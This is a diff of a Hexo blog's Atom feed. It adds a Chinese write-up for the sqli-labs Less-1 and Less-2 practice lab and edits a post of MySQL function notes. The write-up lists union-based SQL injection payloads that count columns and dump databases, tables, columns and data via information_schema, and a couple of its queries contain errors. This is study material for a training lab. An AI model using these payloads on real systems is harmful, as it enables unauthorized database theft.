@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-10-29T10:58:31.836Z</updated>
+  <updated>2023-11-05T09:02:09.115Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SQLI_lab.less.1andless.2</title>
+    <link href="http://example.com/2023/11/05/SQLI-lab-less-1andless-2/"/>
+    <id>http://example.com/2023/11/05/SQLI-lab-less-1andless-2/</id>
+    <published>2023-11-05T07:12:00.000Z</published>
+    <updated>2023-11-05T09:02:09.115Z</updated>
+    
+    <content type="html"><![CDATA[<p>  一. 整值型注入</p><p>1.判断注入点类型</p><ol><li>id&#x3D;1      页面回显正常</li><li>id&#x3D;1’’    页面回显正常</li></ol><p>由以上可知：该注入点为整值型注入点</p><p>2.确认列数</p><p>采用order by方法：</p><p>?id&#x3D;1 order by 1页面回显正常</p><p>?id&#x3D;1 order by 2页面回显正常</p><p>?id&#x3D;1 order by 3页面回显正常</p><p>?id&#x3D;1 order by 4页面回显不正常：Unknown column ‘4’ in ‘order clause’</p><p>由以上可知：有四列</p><p>3.查询显示位（使用union select）</p><p>不是所有列都能显示，但我们需要显示位，所以2、3两步缺一不可。</p><p>?id&#x3D;-1 union select 1,2,3</p><p>当id值不存在时，方有我们想要的回显，所以id&#x3D;-1;</p><p>页面回显</p><p>​Welcome  Dhakkan<br>​Your Login name:2<br>​Your Password:3</p><p>由以上可知：显示位有两个</p><p>4.爆数据</p><p>a. 爆所有数据库名：</p><p>?id&#x3D;-1 union select 1,group_concat(schema_name),3 from information_schema.schemata –+ </p><p>b. 爆所有表名：</p><p>?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where schema.schemata&#x3D;’goal-database’ –+</p><p>c.爆所有列名：</p><p>?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’goal-table’ –+</p><p>d.爆所有数据：</p><p>?id&#x3D;-1 union select 1, group_concat_group(goal-column),3 from goal-database.goal-table –+ </p><p>小结：</p><ul><li>这种方法有很好的普遍性</li><li>goal-database：目标数据库名字；goal-table：目标表名；goal-column：目标列名</li><li>注释为   空格–+空格 </li><li>注释不能省略，你无法确定其背后的语句在拼接之后是否语法正确</li></ul><p>二. 字符串型注入</p><p>1.判断注入点类型</p><ol><li>id&#x3D;1页面回显正常</li><li>id&#x3D;1’’       页面回显正常</li></ol><p>由以上可知：该注入点为字符串型注入点</p><p>2之后一切类似，但注意id&#x3D;1’或id&#x3D;-1’，这里是需要补一个单引号的，至于注释，这两种方法都要，别嫌麻烦</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;  一. 整值型注入&lt;/p&gt;
+&lt;p&gt;1.判断注入点类型&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;id&amp;#x3D;1      页面回显正常&lt;/li&gt;
+&lt;li&gt;id&amp;#x3D;1’’    页面回显正常&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;由以上可知：该注入点为整值型注入点&lt;/p&gt;
+&lt;p&gt;2.确认</summary>
+      
+    
+    
+    
+    <category term="SQLI_lab" scheme="http://example.com/categories/SQLI-lab/"/>
+    
+    
+    <category term="字符串型及整值型注入" scheme="http://example.com/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9E%8B%E5%8F%8A%E6%95%B4%E5%80%BC%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>SQL笔记1.0查询</title>
@@ -212,9 +243,9 @@
     <link href="http://example.com/2023/10/22/MySQL%E5%8D%95%E8%A1%8C%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B01-0/"/>
     <id>http://example.com/2023/10/22/MySQL%E5%8D%95%E8%A1%8C%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B01-0/</id>
     <published>2023-10-22T15:25:28.000Z</published>
-    <updated>2023-10-24T14:47:07.461Z</updated>
+    <updated>2023-11-05T07:17:25.654Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="MySQL单行处理函数1-0"><a href="#MySQL单行处理函数1-0" class="headerlink" title="MySQL单行处理函数1.0"></a>MySQL单行处理函数1.0</h1><h2 id="一-lower-转换小写"><a href="#一-lower-转换小写" class="headerlink" title="一. lower 转换小写"></a>一. lower 转换小写</h2><p><code>select  </code></p><p><code>lower(name1)  name2 </code></p><p><code>from</code> </p><p><code> name(表名);</code> </p><h2 id="二-upper-转换大写"><a href="#二-upper-转换大写" class="headerlink" title="二. upper 转换大写"></a>二. upper 转换大写</h2><p><code>select </code></p><p><code> upper(name1)  name2</code> </p><p><code> from </code>  </p><p><code>name(表名);</code> </p><h2 id="三-substr-取子串（substr-被截取的字符串-起始下标-截取的长度-）"><a href="#三-substr-取子串（substr-被截取的字符串-起始下标-截取的长度-）" class="headerlink" title="三. substr 取子串（substr( 被截取的字符串, 起始下标,截取的长度)）"></a>三. substr 取子串（substr( 被截取的字符串, 起始下标,截取的长度)）</h2><p><code>select </code></p><p><code>substr(name1,n,m) name2</code></p><p><code> from</code> </p><p><code> name(表名);</code></p><p>n&gt;&#x3D;1, m&gt;&#x3D;1；name1 是列名。</p><h3 id="附带例子："><a href="#附带例子：" class="headerlink" title="附带例子："></a>附带例子：</h3><h4 id="找出员工名字第一个字母是A的员工信息？"><a href="#找出员工名字第一个字母是A的员工信息？" class="headerlink" title="找出员工名字第一个字母是A的员工信息？"></a>找出员工名字第一个字母是A的员工信息？</h4><h5 id="第一种方式：模糊查询"><a href="#第一种方式：模糊查询" class="headerlink" title="第一种方式：模糊查询"></a>第一种方式：模糊查询</h5><p><code>select</code></p><p> ename&#96; </p><p><code>from</code> </p><p><code>emp</code></p><p><code> where</code> </p><p><code> ename like &#39;A%&#39;;</code></p><h5 id="第二种方式：substr函数"><a href="#第二种方式：substr函数" class="headerlink" title="第二种方式：substr函数"></a>第二种方式：substr函数</h5><p><code>select</code></p><p><code>ename</code> </p><p><code>from</code></p><p><code>emp</code> </p><p><code>where </code></p><p><code>substr(ename,1,1) = &#39;A&#39;;</code></p><h3 id="拓展例子："><a href="#拓展例子：" class="headerlink" title="拓展例子："></a>拓展例子：</h3><h4 id="实现首字母大写"><a href="#实现首字母大写" class="headerlink" title="实现首字母大写"></a>实现首字母大写</h4><p><code>select</code></p><p><code> concat(upper(substr(name,1,1)),substr(name,2,length(name) - 1)) as result</code> </p><p><code> from</code> </p><p><code> t_student;</code></p><h4 id="补充：concat-：进行字符串的拼接"><a href="#补充：concat-：进行字符串的拼接" class="headerlink" title="补充：concat ：进行字符串的拼接"></a>补充：concat ：进行字符串的拼接</h4><p><code>select </code></p><p><code> concat  (name1,name2) name3</code> </p><p><code> from</code> </p><p><code>  name(表名);</code></p><h2 id="四-length-取长度"><a href="#四-length-取长度" class="headerlink" title="四. length 取长度"></a>四. length 取长度</h2><p><code>select</code></p><p><code>  length(name)  lengthname</code>  </p><p><code>  from</code>  </p><p><code> name(表名);</code> </p><h2 id="五-trim-去空格"><a href="#五-trim-去空格" class="headerlink" title="五. trim 去空格"></a>五. trim 去空格</h2><p><code>select</code> </p><p><code>trim(&#39;             A&#39;)</code></p><p><code>from</code> </p><p><code>name(表名)；</code></p><p>查询带 A 的数据</p><p>六. round 四舍五入</p><ol><li><p>先介绍 select 后面可以跟字面量&#x2F;字面值（1000等），也可以跟字符串，但是无论如何，都将把数据同化成它。</p></li><li><p>a.  select</p><p>​     round(1234.567,0) name1</p><p>​     from</p><p>​     name(表名);</p><p>b.  select</p><p>​     round(1234.567,1) name1</p><p>​     from</p><p>​     name(表名);</p><p>c.  select</p><p>​     round(1234.567,-1) name1</p><p>​     from</p><p>​     name(表名);</p></li></ol><p>a. 数据是：1234；b. 数据是：1234.6；c. 数据是：1240</p><p>round(a,n) 中 a 为被四舍五入的数据，n为保留到小数点后几位，n&lt;0 即为整数位四舍五入</p><p>六. rand() 生成随机数</p><p>select</p><p>rand()</p><p>from</p><p>emp;</p><p>七. ifnull 将 null 转换成一个具体值</p><p>ifnull是空处理函数。专门处理空的。在所有数据库当中，只要有NULL参与的数学运算，最终结果就是NULL。</p><p>select </p><p>sal + ifnull(comm,0)*12</p><p>from </p><p>name(表名);</p><p>ifnull (data,n) ：data 为被处理的数据，n为若数据为null，视其为n</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="MySQL单行处理函数1-0"><a href="#MySQL单行处理函数1-0" class="headerlink" title="MySQL单行处理函数1.0"></a>MySQL单行处理函数1.0</h1><h2 id="一-lower-转换小写"><a href="#一-lower-转换小写" class="headerlink" title="一. lower 转换小写"></a>一. lower 转换小写</h2><p><code>select  </code></p><p><code>lower(name1)  name2 </code></p><p>&#96; from </p><p><code> name(表名);</code> </p><h2 id="二-upper-转换大写"><a href="#二-upper-转换大写" class="headerlink" title="二. upper 转换大写"></a>二. upper 转换大写</h2><p><code>select </code></p><p><code> upper(name1)  name2</code> </p><p><code> from </code>  </p><p><code>name(表名);</code> </p><h2 id="三-substr-取子串（substr-被截取的字符串-起始下标-截取的长度-）"><a href="#三-substr-取子串（substr-被截取的字符串-起始下标-截取的长度-）" class="headerlink" title="三. substr 取子串（substr( 被截取的字符串, 起始下标,截取的长度)）"></a>三. substr 取子串（substr( 被截取的字符串, 起始下标,截取的长度)）</h2><p><code>select </code></p><p><code>substr(name1,n,m) name2</code></p><p><code> from</code> </p><p><code> name(表名);</code></p><p>n&gt;&#x3D;1, m&gt;&#x3D;1；name1 是列名。</p><h3 id="附带例子："><a href="#附带例子：" class="headerlink" title="附带例子："></a>附带例子：</h3><h4 id="找出员工名字第一个字母是A的员工信息？"><a href="#找出员工名字第一个字母是A的员工信息？" class="headerlink" title="找出员工名字第一个字母是A的员工信息？"></a>找出员工名字第一个字母是A的员工信息？</h4><h5 id="第一种方式：模糊查询"><a href="#第一种方式：模糊查询" class="headerlink" title="第一种方式：模糊查询"></a>第一种方式：模糊查询</h5><p><code>select</code></p><p> ename&#96; </p><p><code>from</code> </p><p><code>emp</code></p><p><code> where</code> </p><p><code> ename like &#39;A%&#39;;</code></p><h5 id="第二种方式：substr函数"><a href="#第二种方式：substr函数" class="headerlink" title="第二种方式：substr函数"></a>第二种方式：substr函数</h5><p><code>select</code></p><p><code>ename</code> </p><p><code>from</code></p><p><code>emp</code> </p><p><code>where </code></p><p><code>substr(ename,1,1) = &#39;A&#39;;</code></p><h3 id="拓展例子："><a href="#拓展例子：" class="headerlink" title="拓展例子："></a>拓展例子：</h3><h4 id="实现首字母大写"><a href="#实现首字母大写" class="headerlink" title="实现首字母大写"></a>实现首字母大写</h4><p><code>select</code></p><p><code> concat(upper(substr(name,1,1)),substr(name,2,length(name) - 1)) as result</code> </p><p><code> from</code> </p><p><code> t_student;</code></p><h4 id="补充：concat-：进行字符串的拼接"><a href="#补充：concat-：进行字符串的拼接" class="headerlink" title="补充：concat ：进行字符串的拼接"></a>补充：concat ：进行字符串的拼接</h4><p><code>select </code></p><p><code> concat  (name1,name2) name3</code> </p><p><code> from</code> </p><p><code>  name(表名);</code></p><h2 id="四-length-取长度"><a href="#四-length-取长度" class="headerlink" title="四. length 取长度"></a>四. length 取长度</h2><p><code>select</code></p><p><code>  length(name)  lengthname</code>  </p><p><code>  from</code>  </p><p><code> name(表名);</code> </p><h2 id="五-trim-去空格"><a href="#五-trim-去空格" class="headerlink" title="五. trim 去空格"></a>五. trim 去空格</h2><p><code>select</code> </p><p><code>trim(&#39;             A&#39;)</code></p><p><code>from</code> </p><p><code>name(表名)；</code></p><p>查询带 A 的数据</p><p>六. round 四舍五入</p><ol><li><p>先介绍 select 后面可以跟字面量&#x2F;字面值（1000等），也可以跟字符串，但是无论如何，都将把数据同化成它。</p></li><li><p>a.  select</p><p>​     round(1234.567,0) name1</p><p>​     from</p><p>​     name(表名);</p><p>b.  select</p><p>​     round(1234.567,1) name1</p><p>​     from</p><p>​     name(表名);</p><p>c.  select</p><p>​     round(1234.567,-1) name1</p><p>​     from</p><p>​     name(表名);</p></li></ol><p>a. 数据是：1234；b. 数据是：1234.6；c. 数据是：1240</p><p>round(a,n) 中 a 为被四舍五入的数据，n为保留到小数点后几位，n&lt;0 即为整数位四舍五入</p><p>六. rand() 生成随机数</p><p>select</p><p>rand()</p><p>from</p><p>emp;</p><p>七. ifnull 将 null 转换成一个具体值</p><p>ifnull是空处理函数。专门处理空的。在所有数据库当中，只要有NULL参与的数学运算，最终结果就是NULL。</p><p>select </p><p>sal + ifnull(comm,0)*12</p><p>from </p><p>name(表名);</p><p>ifnull (data,n) ：data 为被处理的数据，n为若数据为null，视其为n</p>]]></content>
     
     
       
